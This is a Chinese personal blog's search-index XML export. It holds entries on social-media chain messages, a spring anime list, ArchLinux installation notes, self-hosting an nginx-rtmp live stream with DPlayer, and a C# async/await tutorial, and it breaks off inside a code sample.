<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【碎碎念】从『不转发Unlucky』到『不转不是中国人』</title>
    <url>/archives/1000.html</url>
    <content><![CDATA[<p>记得在好久好久以前，有个世界叫QQ空间。以前那时候，申请一个甭提有多骄傲。那里可以记载心情，写写不开心的事发泄一下。无聊的时候，还可以看一下其他同学，“诶你今天被老师说了？没事下次咱们一起教训他”。当然，这大多都是开玩笑的，不过大家便可以在这互相了解对方，上学时也可以互相安慰。</p>
<span id="more"></span>

<p>不久以后有个认证空间来着，QQ空间的气氛就这么被污染了。什么看到这条消息3天内不转发_*_什么的，刚开始语气还没那么重，“期末考试不及格”，后来就完全变成诅咒了。这个时候，这些东西大多都是面向小年轻的，而认证空间也大多是为了攒点粉丝罢了，我记得我最早看到谣言也是从这里开始的，好象是说啥微软有个蓝色的五角星啥啥啥是美帝的啥武器要你不要确定，当时年幼无知的我还没啥信息分辨的能力，还真信了。现在回过头想想，也就是个玩笑话。</p>
<p>再后来，出现了微信朋友圈。跟QQ空间一样，一开始，大家也是互相晒生活，晒照片，晒心情。后来也是演变成了许多谣言的散布平台。当然我并不否认微信的积极作用，但一些看起来可笑而又滑稽的言论却是存在的，说是为了鼓舞民族士气。虽说看起来国家强大了也不是不可以，但也要按事实说话啊，如果将来报道……</p>
<p>比如这样的</p>
<h1 id="转自Telegram"><a href="#转自Telegram" class="headerlink" title="转自Telegram"></a>转自Telegram</h1><p>朋友圈的面向对象大概是几乎全年龄段的，下到小朋友，上到大朋友，不转发Unluckly的设定显然已经适用不了这些大朋友们，于是他们便会选择另一种方式，比如：“你不转不是中国人。”</p>
<p>哇这就很揪民心了对不对，不转不是中国人怎么能行啊？当然得转转转啊！这样不转不是中国人的方式究竟会带来什么影响呢？</p>
<p>比如你会推销西瓜。</p>
<p>推销西瓜也就罢了，如果你说话说的有那么一点差错，你就是叛国了，这种思想却是很危险的。</p>
<p>打个比方说，以前打砸日货的问题。</p>
<p>打砸日货这倒没你啥事，但你打的是人家的东西，人家喜欢人家就买呗，你自己喜欢你买个几百个手办回来随你砸，你砸别人的就不对了，砸坏花花草草也不好啊。</p>
<p>他们说这是爱国。</p>
<p>不不不，有时候你爱国看不出来，碍国就差不多了。</p>
<p>记得以前还有什么谷歌威胁论，什么谷歌地图扫到了军方基地才导致被赶出中国之类的。却未见百度魏则西事件之时，他们会有什么说。为啥？爱国？有时候真的觉得，有这么一堵墙这么防这么我们，也许是坏事，也许却是好事。</p>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
      <tags>
        <tag>果果</tag>
      </tags>
  </entry>
  <entry>
    <title>【番】看介绍好像比较好看的四月新番</title>
    <url>/archives/993.html</url>
    <content><![CDATA[<p>最近龙女仆完结了，突然感觉好像少了点什么。<br>对的确实是少了点什么。<br>颓废可以，怎么能没番看呢！</p>
<p>四月是你的新番</p>
<span id="more"></span>

<p>=======</p>
<h3 id="1-恋爱暴君"><a href="#1-恋爱暴君" class="headerlink" title="1.恋爱暴君"></a>1.<a href="https://bangumi.bilibili.com/anime/5996">恋爱暴君</a></h3><blockquote>
<p>简介:大学生的森永，暗恋非常讨厌同性恋且个性凶暴蛮横的学长巽，终于要步入第5年了，想要传达自己的心意，甚至是一亲芳泽就宛如是梦中之梦一般……而就在森永已经半死心的时候，一个绝佳的机会来了！森永多年的思念是否能得到回报呢？ ——维基百科</p>
</blockquote>
<p>搞错了搞错了</p>
<blockquote>
<p>简介:死神模样的少女古莉出现在男高中生青司的身边，古莉实际上是天使，并持有“写上名字的人必定会接吻”的“亲吻笔记本”，但是笔记本带有“如果不在24小时内接吻，写上的人（古莉）就会死，被写上的人（青司）将终生是处男”的副作用。隔天，青司在学校遇见自己憧憬的美少女茜，而茜其实喜欢青司到不行，且因为误会古莉是“青司的女朋友”而向他们发动攻击，结果茜在阴错阳差之下与青司接吻。接着古莉便以“两人在刹那间心灵相通”为由，在亲吻笔记上写下茜的名字。茜在得知“被写在亲吻笔记上的人一旦接吻就必定会结婚，并且永永远远结合在一起”后欣喜若狂，然而古莉却以“我也对青司有兴趣”为由，悄悄在笔记本上写下自己的名字…… ——<a href="https://zh.wikipedia.org/wiki/%E6%88%80%E6%84%9B%E6%9A%B4%E5%90%9B_(%E4%B8%89%E6%98%9F%E7%9C%BC%E9%8F%A1%E7%9A%84%E6%BC%AB%E7%95%AB)">维基百科</a></p>
</blockquote>
<p>哇，真的吗</p>
<p><img data-src="/images/Date/2017/04/1155749708.png" alt="1465904254.png" title="1465904254.png"></p>
<p><img data-src="/images/Date/2017/04/2340126330.png" alt="84~YBV70M8$JTXIMS)HCC~J.png" title="84~YBV70M8$JTXIMS)HCC~J.png"></p>
<p>哇，真的吗</p>
<p><img data-src="/images/Date/2017/04/1155749708.png" alt="1465904254.png" title="1465904254.png"></p>
<p>好像很有趣诶</p>
<p>2.<a href="http://bangumi.bilibili.com/anime/5997">埃罗芒阿老师</a></p>
<p>Telegram Stickers &gt; <a href="https://t.me/addstickers/Eromanga_Sensei">Eromanga_Sensei</a></p>
<blockquote>
<p>《埃罗芒阿老师》[1]（日语：エロマンガ先生）是由伏见司创作的一部轻小说，是伏见司自《我的妹妹哪有那么可爱》完结后的第一部新作，并有漫画、广播剧、动画等衍生作品。 ——<a href="https://zh.moegirl.org/%E5%9F%83%E7%BD%97%E8%8A%92%E9%98%BF%E8%80%81%E5%B8%88">萌娘百科</a></p>
</blockquote>
<p><img data-src="/images/Date/2017/04/85756852.png" alt="128198825.png" title="128198825.png"></p>
<p>一开始我是没懂 埃罗芒阿 是啥意思<br>（埃罗芒阿埃罗芒阿埃罗芒阿埃罗芒阿埃罗芒阿埃罗芒阿埃罗芒阿 *ellow man a</p>
<p><img data-src="/images/Date/2017/04/1619936630.png" alt="1739237365.png" title="1739237365.png"></p>
<p>这部动漫挺好看的，主要是讲哥哥和妹妹之间的</p>
<p>创作之路。</p>
<p>该部动画于<a href="http://bangumi.bilibili.com/anime/5997/play#103917">第一集</a> 01:09 完结。</p>
<p>3.<a href="http://bangumi.bilibili.com/anime/5977">夏目 (有蚊) 友人帐</a></p>
<blockquote>
<p>从小就能看见妖怪的少年夏目贵志。自从他从祖母玲子那里继承了与妖怪成为主从并将其名字书写在上的契约书“友人帐”以来，便与自称为保镖的妖怪猫咪老师一同，开始了将名字返还给妖怪的每一天。夏目与各种各样的妖怪与善良人们相遇，在构筑温暖的场所同时，也反复寄托着想要守护重要之物的想法。 ——Bilibili</p>
</blockquote>
<p>一部比较良心又好看又不过气的番。</p>
<h1 id="同年过-气-去老番"><a href="#同年过-气-去老番" class="headerlink" title="同年过 (气) 去老番"></a>同年过 (气) 去老番</h1><p>1.<a href="http://bangumi.bilibili.com/anime/5793">珈百璃的堕落</a></p>
<blockquote>
<p>天使学校的首席天使来到了地球！ ……但是，住惯了地球的她，开始过起整天逃学打网游的自甘堕落生活。 化身为怠惰的废柴天使，简称“废天使”的加百列，早就把让全部人类幸福的目标抛到九霄云外，并发誓要充分享受娱乐—— ——Bilibili</p>
</blockquote>
<p>这部番的话，大概就是两个黑化天使，一个IQ有点低的恶魔和一个善良的恶魔之间的故事。<br>Telegram Sticker &gt; <a href="https://t.me/addstickers/Gabriel_DropOut">Gabriel_DropOut</a> &gt; <a href="https://t.me/addstickers/Satangirl">Satangirl</a></p>
<p>真的挺好看的。<br>看完和在看恋爱暴君一个感觉<br>：天界药丸</p>
<p>2.<a href="http://bangumi.bilibili.com/anime/5800">小林家的龙女仆</a></p>
<blockquote>
<p>在单身的辛苦OL小林身边突然出现的女仆装束的美少女托尔。 长着角和尾巴的她的身姿正是所谓的龙娘。 在醉酒的小林邀请下说要到家里去的托尔，鬼使神差地开始以小林家女仆的身份工作……！？ “女仆”+“龙”=“女仆龙”有着笨手笨脚的可爱之处！ 龙娘与人类之间基本上很温暖、偶尔有些黑暗的异种族间交流喜剧！！ ——Bilibili</p>
</blockquote>
<p>Telegram Stickers &gt; <a href="https://t.me/addstickers/kobayashi">kobayashi</a> &gt; <a href="https://t.me/addstickers/Kanna_hibiki">Kanna_hibiki</a></p>
<p>这个基本就不用说了吧，康娜酱萌人一脸，其自带的官方吐槽也令人值得一看</p>
<p>3.<a href="http://bangumi.bilibili.com/anime/5796">兽娘动物园</a></p>
<blockquote>
<p>有各种动物充满谜团的“加帕利动物园”，游戏内包含有众多少女化的动物，并且能和她们做朋友，而本次动画化将采用全3D动画制作，在还原游戏的世界观的同时，也会带来全新的故事。</p>
</blockquote>
<p><img data-src="/images/Date/2017/04/3651859589.jpg" alt="TK4W%O7%EO6E0XR57ZZ8LGJ.jpg" title="TK4W%O7%EO6E0XR57ZZ8LGJ.jpg"></p>
<p>这个。。。画风有点崩（但听同学说挺好看的我也不知道为啥</p>
<p>博主自己也得上学，所以就只能看这么多（<br>（真是后悔没弄张33卡</p>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
      <tags>
        <tag>果果</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux 安装笔记</title>
    <url>/archives/ArchLinux-Install-Note.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为一些小bug，本身的 killer 网卡无法连接至无线网络，再加上盒盖后电脑经常会睡死，macOS 没怎么用了，于是就想着重装一下 ArchLinux，于是就重装了。</p>
<span id="more"></span>

<h1 id="安装-ArchLinux"><a href="#安装-ArchLinux" class="headerlink" title="安装 ArchLinux"></a>安装 ArchLinux</h1><blockquote>
<p>以下操作参考自资料 <a href="https://wiki.archlinux.org/index.php/Installation_guide">Installation guide - ArchWiki</a></p>
</blockquote>
<p>安装 ArchLinux 前需确保计算机已连接至互联网。</p>
<h2 id="下载-ArchLinux-ISO-镜像"><a href="#下载-ArchLinux-ISO-镜像" class="headerlink" title="下载 ArchLinux ISO 镜像"></a>下载 ArchLinux ISO 镜像</h2><p>在 <a href="https://www.archlinux.org/download/">https://www.archlinux.org/download/</a> 随便找个镜像地址，打开找到 archlinux-2019.<em>.</em>-x86_64.iso 下载，使用 rufus 写入至 U 盘</p>
<h2 id="开机"><a href="#开机" class="headerlink" title="开机"></a>开机</h2><p>就选择引导，之后会进入到 archiso 的界面</p>
<h2 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h2><p>输入 lsblk ，发现之前安装的 macOS 分区放在 nvme0n1p4 ，将其格式化为 xfs 格式</p>
<pre><code>mkfs.xfs -f /dev/nvme0n1p4
</code></pre>
<p>稍等一会，就好了</p>
<h2 id="更换-mirrorlist"><a href="#更换-mirrorlist" class="headerlink" title="更换 mirrorlist"></a>更换 mirrorlist</h2><p>修改 /etc/pacman.d/mirrorlist ，将 #China 下的源提前。推荐 163 源</p>
<h2 id="swap-交换分区"><a href="#swap-交换分区" class="headerlink" title="swap 交换分区"></a>swap 交换分区</h2><p>这个你喜欢，反正我是没搞。按照官方 wiki，这里可以使用单独分区，也可以用 swapfile 交换分区文件</p>
<h2 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h2><h3 id="挂载系统分区"><a href="#挂载系统分区" class="headerlink" title="挂载系统分区"></a>挂载系统分区</h3><p>将分区挂载到 /mnt ，输入</p>
<pre><code>mount /dev/nvme0n1p4 /mnt
</code></pre>
<h3 id="挂载引导分区"><a href="#挂载引导分区" class="headerlink" title="挂载引导分区"></a>挂载引导分区</h3><p>这里我的 esp 分区放在了第一个分区，先创建 /boot/efi 文件夹，再进行挂载</p>
<pre><code>mkdir /boot/efi
mount /dev/nvme0n1p1 /mnt/boot/efi
</code></pre>
<h3 id="生成-fstab"><a href="#生成-fstab" class="headerlink" title="生成 fstab"></a>生成 fstab</h3><pre><code>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
</code></pre>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><h3 id="使用-pacstrap-进行必要包的安装"><a href="#使用-pacstrap-进行必要包的安装" class="headerlink" title="使用 pacstrap 进行必要包的安装"></a>使用 pacstrap 进行必要包的安装</h3><p>U2 说 zen 鸡血内核不错，所以这里用 zen 内核</p>
<pre><code>pacstrap /mnt base base-devel linux-zen linux-firmware
# 用默认内核的话将 linux-zen 换成 linux 就行了
</code></pre>
<h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><p>输入 arch-chroot /mnt 切换至新安装的系统</p>
<h3 id="时区设置"><a href="#时区设置" class="headerlink" title="时区设置"></a>时区设置</h3><pre><code>ln -sf /usr/share/Asia/Shanghai /etc/localtime
hwclock --systohc
</code></pre>
<h3 id="本地化设置"><a href="#本地化设置" class="headerlink" title="本地化设置"></a>本地化设置</h3><p>编辑 /etc/locale.conf，将 LANG=en_US.UTF-8\zh_CN.UTF_8\zh_TW.UTF_8 前的 # 去掉</p>
<p>执行 locale-gen</p>
<h3 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h3><p>输入 useradd -G wheel -m guoguo 新增用户，并输入 passwd guoguo 进行密码重置</p>
<p>输入 visudo ，插入</p>
<pre><code>guoguo (ALL) = (ALL) ALL
</code></pre>
<h3 id="安装-grub-引导"><a href="#安装-grub-引导" class="headerlink" title="安装 grub 引导"></a>安装 grub 引导</h3><p>这里我使用了 UEFI 方式</p>
<p>输入 pacman -S grub 安装 grub，然后输入</p>
<pre><code>grub-install --target=x86_64-efi --efi-directory=/boot/efi
</code></pre>
<p>如果是移动硬盘的话加入 –removeable ，否则可能会出现重启无法进入grub的情况</p>
<p>然后执行</p>
<pre><code>grub-mkconfig -o /boot/grub/grub.cfg
</code></pre>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><p>输入 exit ，然后 reboot，拔除 U 盘。</p>
<p>如果成功进入系统，那</p>
<p>可</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>ArchLinux</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建属于自己的直播间</title>
    <url>/archives/Build-LiveRoom.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在工作室直播的时候，同学一直用的QQ直播，直播质量极其廉价，然后又不是很想用B站直播之类的，毕竟都是自己看，于是就萌生了要自建直播间供工作室大佬使用的想法。</p>
<span id="more"></span>

<h1 id="安装直播服务器"><a href="#安装直播服务器" class="headerlink" title="安装直播服务器"></a>安装直播服务器</h1><h2 id="使用-Docker-安装-nginx-rtmp"><a href="#使用-Docker-安装-nginx-rtmp" class="headerlink" title="使用 Docker 安装 nginx-rtmp"></a>使用 Docker 安装 nginx-rtmp</h2><p>所谓万物皆可 docker，能 docker 的事就别找别的麻烦的，<del>反正学校服务器配置够高，用就是了</del>（</p>
<p>开文件夹，配置 docker-compose.yml</p>
<pre><code>version: &quot;3&quot;

services:
  nginx-rtmp:
    container_name: &quot;nginx-rtmp&quot;
    volumes:
        - &quot;./conf/nginx.conf:/etc/nginx/nginx.conf&quot;
        - &quot;./www:/usr/local/nginx/www&quot;
    image: tiangolo/nginx-rtmp:latest
    ports:
        - &quot;1935:1935/tcp&quot;
    environment:
      TZ: &#39;Asia/Shanghai&#39;
    restart: always
    networks:
        - docker-lemp

networks:
    docker-lemp:
        external:
            name: docker-lemp_default
</code></pre>
<p>这里这么搞是为了可以和我之前用的 docker-lemp 网络对接，当然你也可以直接将生成的流文件文件夹映射到本地的网站目录，这样更方便一点。顺带说一下，这个conf也要映射的原因是要修改默认配置文件。然后默认的1935端口给一下，大概差不多</p>
<h2 id="通过编译安装-nginx-rtmp"><a href="#通过编译安装-nginx-rtmp" class="headerlink" title="** 通过编译安装 nginx-rtmp"></a>** 通过编译安装 nginx-rtmp</h2><p>参考此处资料进行使用，上面用了docker的就不用了</p>
<p><a href="https://github.com/arut/nginx-rtmp-module">https://github.com/arut/nginx-rtmp-module</a></p>
<h2 id="修改-nginx-conf"><a href="#修改-nginx-conf" class="headerlink" title="修改 nginx.conf"></a>修改 nginx.conf</h2><p>使用 docker 的在当前目录下创建 ./conf/nginx.conf</p>
<p>编辑 nginx.conf ，修改为以下内容</p>
<pre><code>worker_processes auto;
rtmp_auto_push on;
events &#123;&#125;
http &#123;
    server &#123;
        listen 80;

        location /hls &#123;
            # Serve HLS fragments
            types &#123;
                application/vnd.apple.mpegurl m3u8;
                video/mp2t ts;
            &#125;
            root /usr/local/nginx/www;
            add_header Cache-Control no-cache;
        &#125;
    &#125;
&#125;
rtmp &#123;
    server &#123;
            listen 1935;
            application live &#123;
                live on;
            &#125;
            application hls &#123;
                live on;
                hls on;
                hls_path /usr/local/nginx/www/hls;
            &#125;
     &#125;
&#125;
</code></pre>
<h2 id="运行-Docker"><a href="#运行-Docker" class="headerlink" title="运行 Docker"></a>运行 Docker</h2><p>输入 sudo docker-compose up -d ，等到容器创建完毕完事～</p>
<h1 id="推流"><a href="#推流" class="headerlink" title="推流"></a>推流</h1><p>nginx-rtmp 搭建好了以后，你就可以进行推流了。</p>
<p>上面开 hls 是为了方便移动端设备直接访问，也是为了方便浏览器上观看直播。</p>
<h2 id="OBS-推流"><a href="#OBS-推流" class="headerlink" title="OBS 推流"></a>OBS 推流</h2><p>打开推流设置页面，服务器填写 rtmp://&lt;IP地址&gt;:1935/hls ，密钥你自己喜欢，点击开始推流，看能不能推上</p>
<p>推上了以后，会在 ./www/hls 文件夹中生成 &lt;密钥&gt;.m3u8 ，说明推流成功</p>
<h2 id="FFMPEG-推流视频"><a href="#FFMPEG-推流视频" class="headerlink" title="FFMPEG 推流视频"></a>FFMPEG 推流视频</h2><p>不想直播了，但是想在直播间循环一些视频</p>
<pre><code>ffmpeg -re -stream_loop -1 -i &lt;视频名&gt; -vcodec copy -acodec copy  -f flv rtmp://&lt;IP地址&gt;:1935/hls/&lt;密钥&gt;
</code></pre>
<h2 id="https-强迫症"><a href="#https-强迫症" class="headerlink" title="https 强迫症"></a>https 强迫症</h2><p>如果你有 https 强迫症，或者说不想看端口，你也可以套一层 nginx 反代，或者直接在上面的 nginx 改设置</p>
<pre><code>location / &#123;
        proxy_pass  http://nginx-rtmp/;

        #Proxy Settings
        proxy_redirect     off;
        proxy_set_header   Host             $host;
        proxy_set_header   X-Real-IP        $remote_addr;
        proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
        proxy_max_temp_file_size 0;
        proxy_connect_timeout      90;
        proxy_send_timeout         90;
        proxy_read_timeout         90;
        proxy_buffer_size          4k;
        proxy_buffers              4 32k;
        proxy_busy_buffers_size    64k;
        proxy_temp_file_write_size 64k;
   &#125;
</code></pre>
<p>1935 那噶哒端口也一样，写就对了</p>
<p>然后串流地址就可以改成 <a href="https://xxxxx/hls">https://xxxxx/hls</a> </p>
<h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><p>参考资料：<a href="http://dplayer.js.org/zh/guide.html">http://dplayer.js.org/zh/guide.html</a></p>
<p>为了图省事，我这里使用了 hls.js + DPlayer，直接引入 hls.js 和 dplayer.js 就行</p>
<p>按照 DPlayer 的指南简单写一下</p>
<pre><code>&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;女装直播间&lt;/title&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;DPlayer.min.css&quot; /&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id=&quot;dplayer&quot;&gt;&lt;/div&gt;
    &lt;/body&gt;
    &lt;script src=&quot;hls.min.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;DPlayer.min.js&quot;&gt;&lt;/script&gt;

    &lt;script&gt;
        const dp = new DPlayer(&#123;
            container: document.getElementById(&#39;dplayer&#39;),
                live: true,
            video: &#123;
                url: &#39;test.m3u8&#39;,
                type: &#39;hls&#39;,
            &#125;,
            pluginOptions: &#123;
                hls: &#123;
                    // hls config
                &#125;,
            &#125;,
        &#125;);
    &lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p><del>(Ctrl+C, Ctrl+V ，摸了</del></p>
<p>最后效果和首页的差不多</p>
<h1 id="弹幕服务器"><a href="#弹幕服务器" class="headerlink" title="弹幕服务器"></a>弹幕服务器</h1><p>众所周知，Dplayer 是一个弹幕播放器，那肯定要有弹幕才能尽兴。</p>
<p>开始我试了一下用官方的 docker 容器来搭建，搭好以后发现这个不太适用于直播，适用于视频类的，所以还是得手撸</p>
<p>主要思路是点击发送的时候 DPlayer 调用 apiBackend 的 send，然后再走 websocket 发送弹幕，当websocket 接收到新数据的时候再通过 dp.danmaku.draw 进行渲染。</p>
<p>将 danmaku 的 options 展开还可以指定视频 id、用户之类的，然后为了赶工我就只先搞了视频 id 的，用户啥的还没写</p>
<p>（视频id我就大概用视频地址md5一下差不多了</p>
<p>（说起来找了半天才发现这个 danmaku 是可以展开的（</p>
<h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>利用 Element 来加一点点细节，就很好看啦</p>
<p><img data-src="/images/Article/Live/Live1.png" alt="/images/Article/Live/Live1.png"></p>
<h2 id="多人直播间"><a href="#多人直播间" class="headerlink" title="多人直播间"></a>多人直播间</h2><p>根据 Vue-router 和 Vue 的特性，你可以根据路由来动态改变视频地址和直播间名字</p>
<p><img data-src="/images/Article/Live/otome.png" alt="/images/Article/Live/otome.png"></p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>直播</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>C# 异步编程初体验(Async/Await)</title>
    <url>/archives/CSharp-Async-Await.html</url>
    <content><![CDATA[<h1 id="C-异步编程初体验-Async-Await"><a href="#C-异步编程初体验-Async-Await" class="headerlink" title="C# 异步编程初体验(Async/Await)"></a>C# 异步编程初体验(Async/Await)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直没搞懂 C# 的 async 到底是怎么玩的，一直以为和 node.js 的差不多，直到昨天问了一下 Elepover，才发现一直以来理解的 async 和 await 是错误的，于是写下一篇文章记录一下自己所想，说一下自己的初步理解，有错误之处敬请大佬指正。</p>
<span id="more"></span>

<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>一开始一直认为，只要 C# 的类型是 Task，并且标志了 async 标识符，那么函数就会异步执行。其实不是的，是否异步执行还得取决于 async 的函数内部有无 await 的标识符。</p>
<h2 id="错误的写法"><a href="#错误的写法" class="headerlink" title="错误的写法"></a>错误的写法</h2><p><del>我也不怕丢人</del>，首先先来给大家看一下之前写的错误写法</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task  <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面的输出结果是</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">10</span> seconds later&gt;</span><br><span class="line">test</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br></pre></td></tr></table></figure>

<p>我预想的结果是</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>这显然不太对，这个不应该是异步方法吗？那这样和我直接写同步方法有什么区别呢？</p>
<h2 id="修改后的写法"><a href="#修改后的写法" class="headerlink" title="修改后的写法"></a>修改后的写法</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候的输出结果就和此处一样了，即</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>看到这里，我想不懂的话也大概明白是什么意思了。那么，再来做个试验？</p>
<h2 id="async-中的同步"><a href="#async-中的同步" class="headerlink" title="async 中的同步"></a>async 中的同步</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">						Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            